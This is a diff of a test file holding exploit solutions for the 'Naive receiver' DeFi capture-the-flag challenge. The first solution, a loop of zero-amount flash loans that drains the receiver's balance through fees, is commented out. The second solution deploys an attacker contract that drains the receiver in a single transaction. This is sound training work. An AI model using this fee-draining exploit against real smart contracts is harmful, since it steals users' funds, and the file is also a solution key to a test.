@@ -51,15 +51,24 @@ describe("[Challenge] Naive receiver", function () {
     /** CODE YOUR EXPLOIT HERE */
     // The goal is to drain the user’s contract.
     // each time flashLoan is called, a fixed fee of 1 ether is deducted from the user’s contract
-    const FIXED_FEE = await this.pool.fixedFee();
-    while (
-      await (
-        await ethers.provider.getBalance(this.receiver.address)
-      ).gte(FIXED_FEE)
-    ) {
-      // any arbitrary number for borrowAmount is okay
-      await this.pool.flashLoan(this.receiver.address, 0);
-    }
+    // Sol 1:
+    // const FIXED_FEE = await this.pool.fixedFee();
+    // while (
+    //   await (
+    //     await ethers.provider.getBalance(this.receiver.address)
+    //   ).gte(FIXED_FEE)
+    // ) {
+    //   // any arbitrary number for borrowAmount is okay
+    //   await this.pool.flashLoan(this.receiver.address, 0);
+    // }
+
+    // Sol 2: in a single transaction
+    const AttackerFactory = await ethers.getContractFactory(
+      "NaiveReceiverAttacker",
+      deployer
+    );
+    this.attacker = await AttackerFactory.deploy(this.pool.address);
+    await this.attacker.attack(this.receiver.address);
   });
 
   after(async function () {
